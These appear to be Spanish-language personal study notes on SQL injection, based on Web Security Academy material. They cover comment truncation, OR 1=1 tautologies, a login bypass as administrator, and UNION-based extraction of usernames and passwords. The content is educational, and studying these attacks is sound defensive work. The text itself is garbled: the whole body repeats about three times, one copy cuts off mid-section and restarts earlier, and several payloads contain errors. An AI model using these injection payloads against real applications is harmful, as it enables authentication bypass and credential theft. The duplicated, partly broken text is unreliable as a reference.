# _Mis Apuntes (WebSecurityAcademy)_

## _Que es una Inyeccion SQL_

Es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación reaqliza en su base de datos.

En algunas situaciones, un atcante puede escalar un ataque de inyeccion de SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.

### _Ejemplos Breves_ 


```sql
UNION SELECT username, password FROM users--
```

```sql
SELECT name, description, FROM products WHERE category = 'Gifts' UNION SELECT username, passsowrd FROM users--
```
## _**1.Recuperando datos ocultos**_

Si consideramos que tenemos una aplicacion de shooping que muestra productos en diferentes categorias. 

En esta sección no explicare la anatomia de una URL, esto lo puedes encontrar en Google por ejemplo aqui: [_Anatomia de una URL_](https://developer.mozilla.org/es/docs/Learn/Common_questions/Qu%C3%A9_es_una_URL)

---


Pongamos un ejemplo supongamos que tenemos la categoria de Gifts(Regalos) , la URL es esta:

>_https://insecure-website.com/products?category=Gifts_

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos

La URL anterior definidida estaria interpretandose en SQL de esta manera:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
**Esta consulta preguntará en la base de datos y esta retornara lo siguiente:**

* Todos los detalles(*)
* De la tabla Productos
* Donde la categoría es Gifts
* Lanzara los productos que son iguales a 1

>La restricción liberada = 1 se usa para ocultar productos que no se lanzan.
# _Mis Apuntes (WebSecurityAcademy)_

## _Que es una Inyeccion SQL_

Es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación reaqliza en su base de datos.

En algunas situaciones, un atcante puede escalar un ataque de inyeccion de SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.

### _Ejemplos Breves_ 


```sql
UNION SELECT username, password FROM users--
```

```sql
SELECT name, description, FROM products WHERE category = 'Gifts' UNION SELECT username, passsowrd FROM users--
```
## _**1.Recuperando datos ocultos**_

Si consideramos que tenemos una aplicacion de shooping que muestra productos en diferentes categorias. 

En esta sección no explicare la anatomia de una URL, esto lo puedes encontrar en Google por ejemplo aqui: [_Anatomia de una URL_](https://developer.mozilla.org/es/docs/Learn/Common_questions/Qu%C3%A9_es_una_URL)

---


Pongamos un ejemplo supongamos que tenemos la categoria de Gifts(Regalos) , la URL es esta:

>_https://insecure-website.com/products?category=Gifts_

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos

La URL anterior definidida estaria interpretandose en SQL de esta manera:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
**Esta consulta preguntará en la base de datos y esta retornara lo siguiente:**

* Todos los detalles(*)
* De la tabla Productos
* Donde la categoría es Gifts
* Lanzara los productos que son iguales a 1

>La restricción liberada = 1 se usa para ocultar productos que no se lanzan.

>Para productos no lanzados, presublimente liberados es = 0

<br>En este caso la aplicación no implementa ninguna defensa contra los ataques de inyección SQL, porque un atacante podria consutir un ataque como este:

>_https://insecure_website.com/products?category=Gifts'--_

En esta ocasión vamos a ver lo que significa esto : **'--** , el resultado de la consulta seria esta:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

<br>La clave de esto es la secuencia del doble guión: **--** _que es un indicador de comentarios en SQL_. Lo cual esto hace que el resto de la consulta se interprete como un comentario. Esto elimina de manera efectiva el resto de la consulta, porque ya no incluye ``` AND released = 1``` Esto significa que muestran todos los productos no publicados.

<br>
También yendo mas lejos un atacante puede hacer que la aplicación muestre todos los productos de cualquier categoría, ahora lo veremos como: 

>_https://insecure-website.com/products?category=Gifts'+OR+1=1--_

El resultado de esta consulta SQL sería esta manera: 

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
## _Explicación de OR + 1 = 1_

Empezemos entendiendo que en enunciado siempre verdadero esto se usa entre otras cosas para ```ANULAR la condición WHERE y obtener todos los resultados de una consulta.```

Es un enunciado siempre verdadero que se usa para , entre otras cosas, anular una condición Where y obtener todos los resultados de una consulta.

Supongamos que tenemos una tabla usuario , y un campo nombre_usuario

```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’
```
Esta consulta devuelve los registros donde nombre_usuario sea Smith.

Suponiendo que la tabla hubiese unicidad por este campo, devolvería 1 solo registro.

Si ahora hacemos:
```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’ OR 1=1
```
>Como 1=1 es SIEMPRE verdadero, nombre_usuario=’Smith’ OR 1=1 siempre es verdadero de acuerdo a la tabla de verdad de OR.

Como resultado el ```SELECT``` alterado devuelve TODOS los registros.

Esta es una técnica básica de inyección SQL para que una consulta devuelva información adicional por alteración ‘aditiva’ (es decir, la consulta original permanece inalterada, y se añade texto que altera su resultado).

## _Taulogía - Explicación._

Es una condicion que siempre es verdadera, ES DECIR ES UNA FORMULA BIEN FORMULADA que resulta siempre verdadera para cualquier interpretación.

## _**Diagrama Tabla de verdad**_

<img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Logical_connectives_Hasse_diagram.svg" alt="kodama" style="width:50%; margin:left; display:block;">

## _**2. Subvirtiendo la lógica de la aplicación**_

Considere una aplicación que permita a los usuarios iniciar sesión con un nombre de usuario y contraseña. Si un usuario envía el nombre de usuario ```rebcesp``` y la contraseña por ejemplo ```123456```, la aplicación lo que hace es verificar estos datos consultado la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username = 'rebcesp' AND password = '123456'
```
Si la consulta devuleve los detalles de un usuario, el inicio sesión se realiza correctamente. De lo contrario, es rechazado.

Aquí, un atacante puede iniciar sesión como cualquier usuario sin una contraseña simplemente utilizando la secuencia de comentarios de SQL, para eliminar la verificación de la contraseña
de la cláusula ```WHERE``` de la consulta. Por ejemplo si queremos saltarnos esto y acceder como administrador de la aplicacion web enviariamos el nombre de administrador y una contraseña en blanco. La consulta SQL seria de esta manera

```sql
SELECT * FROM users WHERE username = 'administrador'-- AND password = ""
```

La consulta nos retornara el acceso de administrador porque estamos usando la sintaxis de de comentarios ```--``` que lo que hace es evadir la clausula ```WHERE``` teniendo el acceso.

## _**3.Recuperando datos de otras tablas de bases de datos**_ 

En caso que los resultados de una consulta SQL se devuelven dentro de las respuestas de la aplicación, un atacante podría aprovechar esta vulnerabilidad de inyección de SQL para recuperar datos de otras tablas de la base de datos. Esto se haría con la palabra clave ```UNION```, que le permite ejecutar una consulta ```SELECT``` adicional y agregar los resultados a la consulta original.

Supongamos que tenemos una aplicación web y consultamos que contiene la categoría _"Juguetes"_:

```sql
SELECT name, description FROM productos WHERE category = 'Juguetes'
```

En esta ocasión el atacante podría consultar con una query de esta forma:

```sql
' UNION SELECT username, password  FROM users--
```
Esto nos devuelve todos los nombres de usuarios y contraseñas junto a nombres y descripciones.

### _**Inyeccion SQL - Ataques UNION**_

Cuando una aplicación es vulnerable a la inyeccion de SQL, y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación. la palabra clave ```UNION``` se puede usar para recuperar datos de otras tablas dentro de la base de datos. Esto resulta ser un ataque de INYECCION UNION en SQL

Por ejemplo:

```sql
SELECT a,b FROM table1 UNION SELECT c,d FROM table2
```

Esta consulta SQL devolverá un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en la ```tabla1``` y las columnas `c` y `d` en la `tabla2`

_Para que una consulta ```UNION``` funcione, se deben cumplir dos requisitos clave_

>Las consultas individuales deben devolver el mismo número de columnas

>Los tipos de datos en cada columna deben ser compatibles entre las consultas individuales.

Para llevar a cabo un ataque UNION de inyeccion SQL, debe asegurarse de que su ataque cumple estos dos requisitos. Esto generalmente implica descubrir:

>¿Cuántas columnas se devuelven de la consulta original?

>¿Qué columnas devueltas de la consulta original son de un tipo de datos adecuados para contener los resultados de la consulta inyectada?

### **_Determinacíon del número de columnas necesarias en un ataque UNION de inyección SQL_**


Al realizar un ataque ```UNION``` de inyección SQL , existen dos métodos efectivos para determinar cuántas columnas se devuelven desde la consulta original.

**El primer método** consiste en inyectar una serie de cláusulas ```ORDER BY``` e incrementar el índice de columna especificado hasta que se produce un error. Por ejemplo, suponiendo que el punto de inyección es una cadena entre comillas dentro de la cláusula ```WHERE``` de la consulta original, deberá enviar:


```sql
'ORDER BY 1--
'ORDER BY 2--
'ORDER BY 3--
```

Si tenemos una tabla creada por ejemplo llamada Jugadores y 3 columnas , claramente no sabemos el numero de columnas en total que puede tener la tabla, consultariamos de esta manera:

```sql
SELECT * FROM Jugadores ORDER BY 1;
```
De esta manera sabremos cuantas columnas tenemos en total cuando nos lanze un error que la columna no existe en la tabla:

>Unknown column '4' in 'order clause'

La aplicación podría devolver el error de la base de datos en su respuesta HTTP , o podría resolver un error genérico, o simplemente no devolver ningun resultado. Siempre que pueda detetar alguna diferencia en la respuesta de la aplicación, puede inferir cuántas columnas se devuelven desde la consulta.

**El segundo método** consiste en enviar una serie de cargas útiles ```'UNION SELECT``` especificando un número diferente de valores nulos:

```sql
'UNION SELECT NULL--
'UNION SELECT NULL, NULL--
'UNION SELECT NULL,NULL, NULL--
```
La query que utilizaría seria igual de la tabla Jugadores:

```sql
SELECT * FROM Authors UNION SELECT NULL,NULL,NULL;
```

Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:

>The used SELECT statements have a different number of columns


>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists

### _**Encontrar columnas con un tipo de datos útil en un ataque UNION de inyeccion SQL**_

El motivo para realizar un ataque `UNION` de inyeccion SQL es poder recuperar los resultados de una consulta inyectada. En general, los datos interesantes que desea recuperar estarán en forma de cadena, por lo que necesita encontrar una o más columnas en los resultados de la consulta original cuyo tipo de datos sea, o sea compatible con, datos de cadena.

Una vez que haya determinado el número de columnas requeridas, puede probar cada columna para comprobar si puede contener datos de cadena enviando una serie de cargas útiles ```UNION SELECT``` que colocan un valor de cadena en cada columna. Por ejemplo, si la consulta devuelve 3 columnas. La query seria de esta manera:

```sql
'UNION SELECT', NULL,NULL,NULL--
'UNION SELECT NULL,'a',NULL,
'UNION SELECT NULL, NULL, 'a', NULL--
'UNION SELECT NULL,NULL,NULL,'a'--
```

Si el tipo de datos de una columna no es compatible con los datos de la cadena, la consulta inyectada causará un error en la base de datos, como: 

>Conversion failed when converting the varchar value 'a' to data type int.

Si no se produce un error y la respuesta de la aplicación contiene algun contenido adicional que incluye el valor de la cadena inyectada, entonces la columna correspondiente es adecuada para recuperar los datos de la cadena.

### _**Usando un ataque UNION de inyeccion SQL para recuperar datos interesantes**_


Cuando se haya determinado el número de columnas devueltas por la consulta que hemos introducido ne la URL y haya encontrado qué columnas pueden contener datos de cadena, podrá recuperar datos interesantes:

Supongamos que la consulta:

* Devuelve dos columnas, las cuales pueden contener datos de cadena.
* El punto de inyección es una cadena entre comillas dentro de la cláusula WHERE
* La base de datos contiene una tabla llamada ```usuarios``` con las columna nombre de ```usuario & contraseña```.
  
En esta situación, puede recuperar el contenido de la tabla de usuarios enviando la entrada:

```sql
'UNION SELECT usuario , contraseña FROM usuarios--
```
Por supuesto la información crucual que se necesita para realizar este ataque es que tiene que existir una tabla llamada ```usuarios``` con dos columnas llamadas ```usuario``` y ```contraseña```. Sin esta información, se quedaría tratando de adivinar los nombres de las tablas y columnas. De hecho, todas las bases de datos modernas proporcionan formas de examinar la estructura de la base de datos, para determinar qué tablas y columnas contiene.

### _**Recuperando múltiples valores dentro de una sola columna**_


>Para productos no lanzados, presublimente liberados es = 0

<br>En este caso la aplicación no implementa ninguna defensa contra los ataques de inyección SQL, porque un atacante podria consutir un ataque como este:

>_https://insecure_website.com/products?category=Gifts'--_

En esta ocasión vamos a ver lo que significa esto : **'--** , el resultado de la consulta seria esta:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

<br>La clave de esto es la secuencia del doble guión: **--** _que es un indicador de comentarios en SQL_. Lo cual esto hace que el resto de la consulta se interprete como un comentario. Esto elimina de manera efectiva el resto de la consulta, porque ya no incluye ``` AND released = 1``` Esto significa que muestran todos los productos no publicados.

<br>
También yendo mas lejos un atacante puede hacer que la aplicación muestre todos los productos de cualquier categoría, ahora lo veremos como: 

>_https://insecure-website.com/products?category=Gifts'+OR+1=1--_

El resultado de esta consulta SQL sería esta manera: 

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
## _Explicación de OR + 1 = 1_

Empezemos entendiendo que en enunciado siempre verdadero esto se usa entre otras cosas para ```ANULAR la condición WHERE y obtener todos los resultados de una consulta.```

Es un enunciado siempre verdadero que se usa para , entre otras cosas, anular una condición Where y obtener todos los resultados de una consulta.

Supongamos que tenemos una tabla usuario , y un campo nombre_usuario

```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’
```
Esta consulta devuelve los registros donde nombre_usuario sea Smith.

Suponiendo que la tabla hubiese unicidad por este campo, devolvería 1 solo registro.

Si ahora hacemos:
```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’ OR 1=1
```
>Como 1=1 es SIEMPRE verdadero, nombre_usuario=’Smith’ OR 1=1 siempre es verdadero de acuerdo a la tabla de verdad de OR.

Como resultado el ```SELECT``` alterado devuelve TODOS los registros.

Esta es una técnica básica de inyección SQL para que una consulta devuelva información adicional por alteración ‘aditiva’ (es decir, la consulta original permanece inalterada, y se añade texto que altera su resultado).

## _Taulogía - Explicación._

Es una condicion que siempre es verdadera, ES DECIR ES UNA FORMULA BIEN FORMULADA que resulta siempre verdadera para cualquier interpretación.

## _**Diagrama Tabla de verdad**_

<img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Logical_connectives_Hasse_diagram.svg" alt="kodama" style="width:50%; margin:left; display:block;">

## _**2. Subvirtiendo la lógica de la aplicación**_

Considere una aplicación que permita a los usuarios iniciar sesión con un nombre de usuario y contraseña. Si un usuario envía el nombre de usuario ```rebcesp``` y la contraseña por ejemplo ```123456```, la aplicación lo que hace es verificar estos datos consultado la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username = 'rebcesp' AND password = '123456'
```
Si la consulta devuleve los detalles de un usuario, el inicio sesión se realiza correctamente. De lo contrario, es rechazado.

Aquí, un atacante puede iniciar sesión como cualquier usuario sin una contraseña simplemente utilizando la secuencia de comentarios de SQL, para eliminar la verificación de la contraseña
de la cláusula ```WHERE``` de la consulta. Por ejemplo si queremos saltarnos esto y acceder como administrador de la aplicacion web enviariamos el nombre de administrador y una contraseña en blanco. La consulta SQL seria de esta manera

```sql
SELECT * FROM users WHERE username = 'administrador'-- AND password = ""
```

La consulta nos retornara el acceso de administrador porque estamos usando la sintaxis de de comentarios ```--``` que lo que hace es evadir la clausula ```WHERE``` teniendo el acceso.

## _**3.Recuperando datos de otras tablas de bases de datos**_ 

En caso que los resultados de una consulta SQL se devuelven dentro de las respuestas de la aplicación, un atacante podría aprovechar esta vulnerabilidad de inyección de SQL para recuperar datos de otras tablas de la base de datos. Esto se haría con la palabra clave ```UNION```, que le permite ejecutar una consulta ```SELECT``` adicional y agregar los resultados a la consulta original.

Supongamos que tenemos una aplicación web y consultamos que contiene la categoría _"Juguetes"_:

```sql
SELECT name, description FROM productos WHERE category = 'Juguetes'
```

En esta ocasión el atacante podría consultar con una query de esta forma:

```sql
' UNION SELECT username, password  FROM users--
```
Esto nos devuelve todos los nombres de usuarios y contraseñas junto a nombres y descripciones.

### _**Inyeccion SQL - Ataques UNION**_

Cuando una aplicación es vulnerable a la inyeccion de SQL, y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación. la palabra clave ```UNION``` se puede usar para recuperar datos de otras tablas dentro de la base de datos. Esto resulta ser un ataque de INYECCION UNION en SQL

Por ejemplo:

```sql
SELECT a,b FROM table1 UNION SELECT c,d FROM table2
```

Esta consulta SQL devolverá un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en la ```tabla1``` y las columnas `c` y `d` en la `tabla2`

_Para que una consulta ```UNION``` funcione, se deben cumplir dos requisitos clave_

>Las consultas individuales deben devolver el mismo número de columnas

>Los tipos de datos en cada columna deben ser compatibles entre las consultas individuales.

Para llevar a cabo un ataque UNION de inyeccion SQL, debe asegurarse de que su ataque cumple estos dos requisitos. Esto generalmente implica descubrir:

>¿Cuántas columnas se devuelven de la consulta original?

>¿Qué columnas devueltas de la consulta original son de un tipo de datos adecuados para contener los resultados de la consulta inyectada?

### **_Determinacíon del número de columnas necesarias en un ataque UNION de inyección SQL_**


Al realizar un ataque ```UNION``` de inyección SQL , existen dos métodos efectivos para determinar cuántas columnas se devuelven desde la consulta original.

**El primer método** consiste en inyectar una serie de cláusulas ```ORDER BY``` e incrementar el índice de columna especificado hasta que se produce un error. Por ejemplo, suponiendo que el punto de inyección es una cadena entre comillas dentro de la cláusula ```WHERE``` de la consulta original, deberá enviar:


```sql
'ORDER BY 1--
'ORDER BY 2--
'ORDER BY 3--
```

Si tenemos una tabla creada por ejemplo llamada Jugadores y 3 columnas , claramente no sabemos el numero de columnas en total que puede tener la tabla, consultariamos de esta manera:

```sql
SELECT * FROM Jugadores ORDER BY 1;
```
De esta manera sabremos cuantas columnas tenemos en total cuando nos lanze un error que la columna no existe en la tabla:

>Unknown column '4' in 'order clause'

La aplicación podría devolver el error de la base de datos en su respuesta HTTP , o podría resolver un error genérico, o simplemente no devolver ningun resultado. Siempre que pueda detetar alguna diferencia en la respuesta de la aplicación, puede inferir cuántas columnas se devuelven desde la consulta.

**El segundo método** consiste en enviar una serie de cargas útiles ```'UNION SELECT``` especificando un número diferente de valores nulos:

```sql
'UNION SELECT NULL--
'UNION SELECT NULL, NULL--
'UNION SELECT NULL,NULL, NULL--
```
La query que utilizaría seria igual de la tabla Jugadores:

```sql
SELECT * FROM Authors UNION SELECT NULL,NULL,NULL;
```

Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:

>The used SELECT statements have a different number of columns


>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists

### _**Encontrar columnas con un tipo de datos útil en un ataque UNION de inyeccion SQL**_

El motivo para realizar un ataque `UNION` de inyeccion SQL es poder recuperar los resultados de una consulta inyectada. En general, los datos interesantes que desea recuperar estarán en forma de cadena, por lo que necesita encontrar una o más columnas en los resultados de la consulta original cuyo tipo de datos sea, o sea compatible con, datos de cadena.

Una vez que haya determinado el número de columnas requeridas, puede probar cada columna para comprobar si puede contener datos de cadena enviando una serie de cargas útiles ```UNION SELECT``` que colocan un valor de cadena en cada columna. Por ejemplo, si la consulta devuelve 3 columnas. La query seria de esta manera:

```sql
'UNION SELECT', NULL,NULL,NULL--
'UNION SELECT NULL,'a',NULL,
'UNION SELECT NULL, NULL, 'a', NULL--
'UNION SELECT NULL,NULL,NULL,'una'--
```

Si el tipo de datos de una columna no es compatible con los datos de la cadena, la consulta inyectada causará un error en la base de datos, como: 

>Conversion failed when converting the varchar value 'a' to data type int.

Si no se produce un error y la respuesta de la aplicación contiene algun contenido adicional que incluye el valor de la cadena inyectada, entonces la columna correspondiente es adecuada para recuperar los datos de la cadena.











# _Mis Apuntes (WebSecurityAcademy)_

## _Que es una Inyeccion SQL_

Es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación reaqliza en su base de datos.

En algunas situaciones, un atcante puede escalar un ataque de inyeccion de SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.

### _Ejemplos Breves_ 


```sql
UNION SELECT username, password FROM users--
```

```sql
SELECT name, description, FROM products WHERE category = 'Gifts' UNION SELECT username, passsowrd FROM users--
```
## _**1.Recuperando datos ocultos**_

Si consideramos que tenemos una aplicacion de shooping que muestra productos en diferentes categorias. 

En esta sección no explicare la anatomia de una URL, esto lo puedes encontrar en Google por ejemplo aqui: [_Anatomia de una URL_](https://developer.mozilla.org/es/docs/Learn/Common_questions/Qu%C3%A9_es_una_URL)

---


Pongamos un ejemplo supongamos que tenemos la categoria de Gifts(Regalos) , la URL es esta:

>_https://insecure-website.com/products?category=Gifts_

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos

La URL anterior definidida estaria interpretandose en SQL de esta manera:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
**Esta consulta preguntará en la base de datos y esta retornara lo siguiente:**

* Todos los detalles(*)
* De la tabla Productos
* Donde la categoría es Gifts
* Lanzara los productos que son iguales a 1

>La restricción liberada = 1 se usa para ocultar productos que no se lanzan.

>Para productos no lanzados, presublimente liberados es = 0

<br>En este caso la aplicación no implementa ninguna defensa contra los ataques de inyección SQL, porque un atacante podria consutir un ataque como este:

>_https://insecure_website.com/products?category=Gifts'--_

En esta ocasión vamos a ver lo que significa esto : **'--** , el resultado de la consulta seria esta:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

<br>La clave de esto es la secuencia del doble guión: **--** _que es un indicador de comentarios en SQL_. Lo cual esto hace que el resto de la consulta se interprete como un comentario. Esto elimina de manera efectiva el resto de la consulta, porque ya no incluye ``` AND released = 1``` Esto significa que muestran todos los productos no publicados.

<br>
También yendo mas lejos un atacante puede hacer que la aplicación muestre todos los productos de cualquier categoría, ahora lo veremos como: 

>_https://insecure-website.com/products?category=Gifts'+OR+1=1--_

El resultado de esta consulta SQL sería esta manera: 

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
## _Explicación de OR + 1 = 1_

Empezemos entendiendo que en enunciado siempre verdadero esto se usa entre otras cosas para ```ANULAR la condición WHERE y obtener todos los resultados de una consulta.```

Es un enunciado siempre verdadero que se usa para , entre otras cosas, anular una condición Where y obtener todos los resultados de una consulta.

Supongamos que tenemos una tabla usuario , y un campo nombre_usuario

```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’
```
Esta consulta devuelve los registros donde nombre_usuario sea Smith.

Suponiendo que la tabla hubiese unicidad por este campo, devolvería 1 solo registro.

Si ahora hacemos:
```sql
SELECT * FROM usuarios WHERE nombre_usuario = ’Smith’ OR 1=1
```
>Como 1=1 es SIEMPRE verdadero, nombre_usuario=’Smith’ OR 1=1 siempre es verdadero de acuerdo a la tabla de verdad de OR.

Como resultado el ```SELECT``` alterado devuelve TODOS los registros.

Esta es una técnica básica de inyección SQL para que una consulta devuelva información adicional por alteración ‘aditiva’ (es decir, la consulta original permanece inalterada, y se añade texto que altera su resultado).

## _Taulogía - Explicación._

Es una condicion que siempre es verdadera, ES DECIR ES UNA FORMULA BIEN FORMULADA que resulta siempre verdadera para cualquier interpretación.

## _**Diagrama Tabla de verdad**_

<img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Logical_connectives_Hasse_diagram.svg" alt="kodama" style="width:50%; margin:left; display:block;">

## _**2. Subvirtiendo la lógica de la aplicación**_

Considere una aplicación que permita a los usuarios iniciar sesión con un nombre de usuario y contraseña. Si un usuario envía el nombre de usuario ```rebcesp``` y la contraseña por ejemplo ```123456```, la aplicación lo que hace es verificar estos datos consultado la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username = 'rebcesp' AND password = '123456'
```
Si la consulta devuleve los detalles de un usuario, el inicio sesión se realiza correctamente. De lo contrario, es rechazado.

Aquí, un atacante puede iniciar sesión como cualquier usuario sin una contraseña simplemente utilizando la secuencia de comentarios de SQL, para eliminar la verificación de la contraseña
de la cláusula ```WHERE``` de la consulta. Por ejemplo si queremos saltarnos esto y acceder como administrador de la aplicacion web enviariamos el nombre de administrador y una contraseña en blanco. La consulta SQL seria de esta manera

```sql
SELECT * FROM users WHERE username = 'administrador'-- AND password = ""
```

La consulta nos retornara el acceso de administrador porque estamos usando la sintaxis de de comentarios ```--``` que lo que hace es evadir la clausula ```WHERE``` teniendo el acceso.

## _**3.Recuperando datos de otras tablas de bases de datos**_ 

En caso que los resultados de una consulta SQL se devuelven dentro de las respuestas de la aplicación, un atacante podría aprovechar esta vulnerabilidad de inyección de SQL para recuperar datos de otras tablas de la base de datos. Esto se haría con la palabra clave ```UNION```, que le permite ejecutar una consulta ```SELECT``` adicional y agregar los resultados a la consulta original.

Supongamos que tenemos una aplicación web y consultamos que contiene la categoría _"Juguetes"_:

```sql
SELECT name, description FROM productos WHERE category = 'Juguetes'
```

En esta ocasión el atacante podría consultar con una query de esta forma:

```sql
' UNION SELECT username, password  FROM users--
```
Esto nos devuelve todos los nombres de usuarios y contraseñas junto a nombres y descripciones.

### _**Inyeccion SQL - Ataques UNION**_

Cuando una aplicación es vulnerable a la inyeccion de SQL, y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación. la palabra clave ```UNION``` se puede usar para recuperar datos de otras tablas dentro de la base de datos. Esto resulta ser un ataque de INYECCION UNION en SQL

Por ejemplo:

```sql
SELECT a,b FROM table1 UNION SELECT c,d FROM table2
```

Esta consulta SQL devolverá un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en la ```tabla1``` y las columnas `c` y `d` en la `tabla2`

_Para que una consulta ```UNION``` funcione, se deben cumplir dos requisitos clave_

>Las consultas individuales deben devolver el mismo número de columnas

>Los tipos de datos en cada columna deben ser compatibles entre las consultas individuales.

Para llevar a cabo un ataque UNION de inyeccion SQL, debe asegurarse de que su ataque cumple estos dos requisitos. Esto generalmente implica descubrir:

>¿Cuántas columnas se devuelven de la consulta original?

>¿Qué columnas devueltas de la consulta original son de un tipo de datos adecuados para contener los resultados de la consulta inyectada?

### **_Determinacíon del número de columnas necesarias en un ataque UNION de inyección SQL_**


Al realizar un ataque ```UNION``` de inyección SQL , existen dos métodos efectivos para determinar cuántas columnas se devuelven desde la consulta original.

**El primer método** consiste en inyectar una serie de cláusulas ```ORDER BY``` e incrementar el índice de columna especificado hasta que se produce un error. Por ejemplo, suponiendo que el punto de inyección es una cadena entre comillas dentro de la cláusula ```WHERE``` de la consulta original, deberá enviar:


```sql
'ORDER BY 1--
'ORDER BY 2--
'ORDER BY 3--
```

Si tenemos una tabla creada por ejemplo llamada Jugadores y 3 columnas , claramente no sabemos el numero de columnas en total que puede tener la tabla, consultariamos de esta manera:

```sql
SELECT * FROM Jugadores ORDER BY 1;
```
De esta manera sabremos cuantas columnas tenemos en total cuando nos lanze un error que la columna no existe en la tabla:

>Unknown column '4' in 'order clause'

La aplicación podría devolver el error de la base de datos en su respuesta HTTP , o podría resolver un error genérico, o simplemente no devolver ningun resultado. Siempre que pueda detetar alguna diferencia en la respuesta de la aplicación, puede inferir cuántas columnas se devuelven desde la consulta.

**El segundo método** consiste en enviar una serie de cargas útiles ```'UNION SELECT``` especificando un número diferente de valores nulos:

```sql
'UNION SELECT NULL--
'UNION SELECT NULL, NULL--
'UNION SELECT NULL,NULL, NULL--
```
La query que utilizaría seria igual de la tabla Jugadores:

```sql
SELECT * FROM Authors UNION SELECT NULL,NULL,NULL;
```

Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:

>The used SELECT statements have a different number of columns


>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists

### _**Encontrar columnas con un tipo de datos útil en un ataque UNION de inyeccion SQL**_

El motivo para realizar un ataque `UNION` de inyeccion SQL es poder recuperar los resultados de una consulta inyectada. En general, los datos interesantes que desea recuperar estarán en forma de cadena, por lo que necesita encontrar una o más columnas en los resultados de la consulta original cuyo tipo de datos sea, o sea compatible con, datos de cadena.

Una vez que haya determinado el número de columnas requeridas, puede probar cada columna para comprobar si puede contener datos de cadena enviando una serie de cargas útiles ```UNION SELECT``` que colocan un valor de cadena en cada columna. Por ejemplo, si la consulta devuelve 3 columnas. La query seria de esta manera:

```sql
'UNION SELECT', NULL,NULL,NULL--
'UNION SELECT NULL,'a',NULL,
'UNION SELECT NULL, NULL, 'a', NULL--
'UNION SELECT NULL,NULL,NULL,'a'--
```

Si el tipo de datos de una columna no es compatible con los datos de la cadena, la consulta inyectada causará un error en la base de datos, como: 

>Conversion failed when converting the varchar value 'a' to data type int.

Si no se produce un error y la respuesta de la aplicación contiene algun contenido adicional que incluye el valor de la cadena inyectada, entonces la columna correspondiente es adecuada para recuperar los datos de la cadena.

### _**Usando un ataque UNION de inyeccion SQL para recuperar datos interesantes**_


Cuando se haya determinado el número de columnas devueltas por la consulta que hemos introducido ne la URL y haya encontrado qué columnas pueden contener datos de cadena, podrá recuperar datos interesantes:

Supongamos que la consulta:

* Devuelve dos columnas, las cuales pueden contener datos de cadena.
* El punto de inyección es una cadena entre comillas dentro de la cláusula WHERE
* La base de datos contiene una tabla llamada ```usuarios``` con las columna nombre de ```usuario & contraseña```.
  
En esta situación, puede recuperar el contenido de la tabla de usuarios enviando la entrada:

```sql
'UNION SELECT usuario , contraseña FROM usuarios--
```
Por supuesto la información crucual que se necesita para realizar este ataque es que tiene que existir una tabla llamada ```usuarios``` con dos columnas llamadas ```usuario``` y ```contraseña```. Sin esta información, se quedaría tratando de adivinar los nombres de las tablas y columnas. De hecho, todas las bases de datos modernas proporcionan formas de examinar la estructura de la base de datos, para determinar qué tablas y columnas contiene.

### _**Recuperando múltiples valores dentro de una sola columna**_

